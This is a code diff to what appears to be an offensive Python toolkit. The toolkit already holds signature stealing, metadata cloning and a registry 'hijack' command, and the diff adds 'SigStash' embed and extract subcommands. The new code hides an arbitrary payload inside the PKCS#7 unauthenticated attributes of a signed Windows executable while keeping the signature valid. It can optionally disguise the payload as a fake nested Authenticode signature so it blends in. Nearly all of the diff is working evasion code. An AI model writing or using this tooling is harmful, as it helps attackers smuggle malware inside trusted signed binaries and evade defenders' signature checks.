@@ -7,6 +7,12 @@ import argparse
 import subprocess
 import os
 
+try:
+    from asn1crypto import cms, core
+    HAS_ASN1CRYPTO = True
+except ImportError:
+    HAS_ASN1CRYPTO = False
+
 # ==========================================
 # PART 1: SigThief (Signature Stealing)
 # ==========================================
@@ -461,7 +467,166 @@ def clone_metadata(source, target, objcopy_path=None):
         return False
 
 # ==========================================
-# PART 4: Main Entry Point
+# PART 4: PKCS#7 Unauthenticated Attribute Embedding (SigStash)
+# ==========================================
+
+PKCS7_DEFAULT_OID = "1.3.6.1.4.1.311.99.1"
+SPC_NESTED_SIGNATURE_OID = "1.3.6.1.4.1.311.2.4.1"
+
+def _require_asn1crypto():
+    if not HAS_ASN1CRYPTO:
+        print("[-] Error: 'asn1crypto' is required for embed/extract commands.")
+        print("    Install with: pip install asn1crypto")
+        sys.exit(1)
+
+def read_pe_pkcs7(data: bytes):
+    """Extract PKCS#7 blob from PE's WIN_CERTIFICATE. Returns (cert_offset, cert_size, pkcs7_bytes)."""
+    if data[:2] != b'MZ':
+        raise ValueError("Not a PE file")
+    pe_offset = struct.unpack_from('<I', data, 0x3C)[0]
+    if data[pe_offset:pe_offset+4] != b'PE\x00\x00':
+        raise ValueError("Invalid PE signature")
+    magic = struct.unpack_from('<H', data, pe_offset + 0x18)[0]
+    if magic == 0x20b:
+        cert_dir_offset = pe_offset + 0x18 + 0x90
+    elif magic == 0x10b:
+        cert_dir_offset = pe_offset + 0x18 + 0x80
+    else:
+        raise ValueError(f"Unknown PE magic: {magic:#x}")
+    cert_rva = struct.unpack_from('<I', data, cert_dir_offset)[0]
+    cert_size = struct.unpack_from('<I', data, cert_dir_offset + 4)[0]
+    if cert_rva == 0 or cert_size == 0:
+        raise ValueError("PE has no embedded signature")
+    win_cert = data[cert_rva:cert_rva + cert_size]
+    dw_length = struct.unpack_from('<I', win_cert, 0)[0]
+    w_type = struct.unpack_from('<H', win_cert, 6)[0]
+    if w_type != 0x0002:
+        raise ValueError(f"WIN_CERTIFICATE type {w_type:#x} is not PKCS7")
+    return cert_rva, cert_size, win_cert[8:dw_length]
+
+def _der_length(length: int) -> bytes:
+    if length < 0x80:
+        return bytes([length])
+    elif length < 0x100:
+        return bytes([0x81, length])
+    elif length < 0x10000:
+        return bytes([0x82, length >> 8, length & 0xFF])
+    elif length < 0x1000000:
+        return bytes([0x83, length >> 16, (length >> 8) & 0xFF, length & 0xFF])
+    else:
+        return bytes([0x84, length >> 24, (length >> 16) & 0xFF, (length >> 8) & 0xFF, length & 0xFF])
+
+def pkcs7_embed_payload(signed_data, payload: bytes, oid: str):
+    """Add payload as unauthenticated attribute to first SignerInfo."""
+    signer = signed_data['signer_infos'][0]
+    oid_der = core.ObjectIdentifier(oid).dump()
+    octet_der = core.OctetString(payload).dump()
+    set_der = b'\x31' + _der_length(len(octet_der)) + octet_der
+    seq_der = b'\x30' + _der_length(len(oid_der) + len(set_der)) + oid_der + set_der
+    attr_value = cms.CMSAttribute.load(seq_der)
+    existing = signer['unsigned_attrs']
+    if existing.native is None:
+        new_attrs = cms.CMSAttributes([attr_value])
+    else:
+        attrs_list = [a for a in existing if a['type'].dotted != oid]
+        attrs_list.append(attr_value)
+        new_attrs = cms.CMSAttributes(attrs_list)
+    signer['unsigned_attrs'] = new_attrs
+    return signed_data
+
+def pkcs7_extract_payload(signed_data, oid: str):
+    """Extract payload from unauthenticated attribute with given OID."""
+    signer = signed_data['signer_infos'][0]
+    unsigned = signer['unsigned_attrs']
+    if unsigned.native is None:
+        return None
+    for attr in unsigned:
+        if attr['type'].dotted == oid:
+            values = attr['values']
+            if len(values) > 0:
+                try:
+                    return core.OctetString.load(values[0].dump()).native
+                except Exception:
+                    return values[0].dump()
+    return None
+
+def _wrap_as_nested_sig(payload: bytes) -> bytes:
+    """Wrap payload in a fake SignedData ContentInfo for SPC_NESTED_SIGNATURE camouflage."""
+    fake_sd = cms.SignedData({
+        'version': 'v1',
+        'digest_algorithms': [{'algorithm': 'sha256'}],
+        'encap_content_info': {
+            'content_type': 'data',
+            'content': payload,
+        },
+        'certificates': [],
+        'signer_infos': [],
+    })
+    fake_ci = cms.ContentInfo({
+        'content_type': 'signed_data',
+        'content': fake_sd,
+    })
+    return fake_ci.dump()
+
+def _unwrap_nested_sig(attr_der: bytes) -> bytes | None:
+    """Extract payload from a fake nested SignedData ContentInfo."""
+    try:
+        ci = cms.ContentInfo.load(attr_der)
+        sd = ci['content']
+        content = sd['encap_content_info']['content']
+        if content.native is not None:
+            return content.native
+        return content.parsed if hasattr(content, 'parsed') else bytes(content)
+    except Exception:
+        return None
+
+def pkcs7_embed_camouflage(signed_data, payload: bytes):
+    """Embed payload as a fake SPC_NESTED_SIGNATURE unauthenticated attribute."""
+    signer = signed_data['signer_infos'][0]
+    nested_der = _wrap_as_nested_sig(payload)
+    oid_der = core.ObjectIdentifier(SPC_NESTED_SIGNATURE_OID).dump()
+    set_der = b'\x31' + _der_length(len(nested_der)) + nested_der
+    seq_der = b'\x30' + _der_length(len(oid_der) + len(set_der)) + oid_der + set_der
+    attr_value = cms.CMSAttribute.load(seq_der)
+    existing = signer['unsigned_attrs']
+    if existing.native is None:
+        new_attrs = cms.CMSAttributes([attr_value])
+    else:
+        attrs_list = [a for a in existing if a['type'].dotted != SPC_NESTED_SIGNATURE_OID]
+        attrs_list.append(attr_value)
+        new_attrs = cms.CMSAttributes(attrs_list)
+    signer['unsigned_attrs'] = new_attrs
+    return signed_data
+
+def pkcs7_extract_camouflage(signed_data) -> bytes | None:
+    """Extract payload from SPC_NESTED_SIGNATURE camouflage attribute."""
+    signer = signed_data['signer_infos'][0]
+    unsigned = signer['unsigned_attrs']
+    if unsigned.native is None:
+        return None
+    for attr in unsigned:
+        if attr['type'].dotted == SPC_NESTED_SIGNATURE_OID:
+            values = attr['values']
+            if len(values) > 0:
+                return _unwrap_nested_sig(values[0].dump())
+    return None
+
+def rebuild_pe_cert(original_data: bytes, cert_offset: int, new_pkcs7: bytes) -> bytes:
+    """Rebuild PE with new PKCS7 signature blob."""
+    pe_offset = struct.unpack_from('<I', original_data, 0x3C)[0]
+    magic = struct.unpack_from('<H', original_data, pe_offset + 0x18)[0]
+    cert_dir_offset = pe_offset + 0x18 + (0x90 if magic == 0x20b else 0x80)
+    dw_length = 8 + len(new_pkcs7)
+    padding = (8 - (dw_length % 8)) % 8
+    win_cert = struct.pack('<IHH', dw_length, 0x0200, 0x0002) + new_pkcs7 + b'\x00' * padding
+    result = bytearray(original_data[:cert_offset])
+    result.extend(win_cert)
+    struct.pack_into('<I', result, cert_dir_offset, cert_offset)
+    struct.pack_into('<I', result, cert_dir_offset + 4, len(win_cert))
+    return bytes(result)
+
+# ==========================================
+# PART 5: Main Entry Point
 # ==========================================
 
 def main():
@@ -482,6 +647,21 @@ def main():
     hijack_parser.add_argument("-p", "--password", required=True, help="Password")
     hijack_parser.add_argument("--action", choices=["hijack", "clean"], default="hijack", help="Action to perform")
     hijack_parser.add_argument("--tool", help="Path to reg.py if not in PATH")
+
+    # Subcommand: embed
+    embed_parser = subparsers.add_parser("embed", help="Embed payload in PKCS#7 unauthenticated attributes (signature stays valid)")
+    embed_parser.add_argument("-s", "--source", required=True, help="Signed PE to embed into")
+    embed_parser.add_argument("-p", "--payload", required=True, help="Payload file to embed")
+    embed_parser.add_argument("-o", "--output", required=True, help="Output PE path")
+    embed_parser.add_argument("--oid", default=PKCS7_DEFAULT_OID, help=f"Custom OID (default: {PKCS7_DEFAULT_OID})")
+    embed_parser.add_argument("--camouflage", action="store_true", help="Wrap payload as a fake SPC_NESTED_SIGNATURE (blends with dual-signed PEs)")
+
+    # Subcommand: extract
+    extract_parser = subparsers.add_parser("extract", help="Extract embedded payload from PKCS#7 unauthenticated attributes")
+    extract_parser.add_argument("-s", "--source", required=True, help="PE with embedded payload")
+    extract_parser.add_argument("-o", "--output", required=True, help="Output payload file")
+    extract_parser.add_argument("--oid", default=PKCS7_DEFAULT_OID, help=f"OID to extract (default: {PKCS7_DEFAULT_OID})")
+    extract_parser.add_argument("--camouflage", action="store_true", help="Extract from SPC_NESTED_SIGNATURE camouflage wrapper")
 
     args = parser.parse_args()
 
@@ -548,6 +728,57 @@ def main():
                 print("[!] Target is now hijacked. Reboot or re-login may be required.")
         else:
             print(f"[-] Operation completed with errors ({success_count}/{total_ops} changes successful).")
+
+    elif args.command == "embed":
+        _require_asn1crypto()
+        with open(args.source, 'rb') as f:
+            pe_data = f.read()
+        with open(args.payload, 'rb') as f:
+            payload = f.read()
+        try:
+            cert_offset, cert_size, pkcs7 = read_pe_pkcs7(pe_data)
+        except ValueError as e:
+            print(f"[-] {e}")
+            sys.exit(1)
+        ci = cms.ContentInfo.load(pkcs7)
+        sd = ci['content']
+        if args.camouflage:
+            sd = pkcs7_embed_camouflage(sd, payload)
+            used_oid = SPC_NESTED_SIGNATURE_OID
+            mode_label = "camouflage (SPC_NESTED_SIGNATURE)"
+        else:
+            sd = pkcs7_embed_payload(sd, payload, args.oid)
+            used_oid = args.oid
+            mode_label = "direct"
+        new_ci = cms.ContentInfo({'content_type': 'signed_data', 'content': sd})
+        output = rebuild_pe_cert(pe_data, cert_offset, new_ci.dump())
+        with open(args.output, 'wb') as f:
+            f.write(output)
+        print(f"[+] Embedded {len(payload):,} bytes [{mode_label}] (OID: {used_oid}) into {args.output}")
+        print(f"[*] Delta: +{len(output) - len(pe_data):,} bytes. Signature remains valid.")
+
+    elif args.command == "extract":
+        _require_asn1crypto()
+        with open(args.source, 'rb') as f:
+            pe_data = f.read()
+        try:
+            _, _, pkcs7 = read_pe_pkcs7(pe_data)
+        except ValueError as e:
+            print(f"[-] {e}")
+            sys.exit(1)
+        ci = cms.ContentInfo.load(pkcs7)
+        if args.camouflage:
+            payload = pkcs7_extract_camouflage(ci['content'])
+            label = f"camouflage OID {SPC_NESTED_SIGNATURE_OID}"
+        else:
+            payload = pkcs7_extract_payload(ci['content'], args.oid)
+            label = f"OID {args.oid}"
+        if payload is None:
+            print(f"[-] No payload found with {label}")
+            sys.exit(1)
+        with open(args.output, 'wb') as f:
+            f.write(payload)
+        print(f"[+] Extracted {len(payload):,} bytes from {label} to {args.output}")
 
     else:
         parser.print_help()
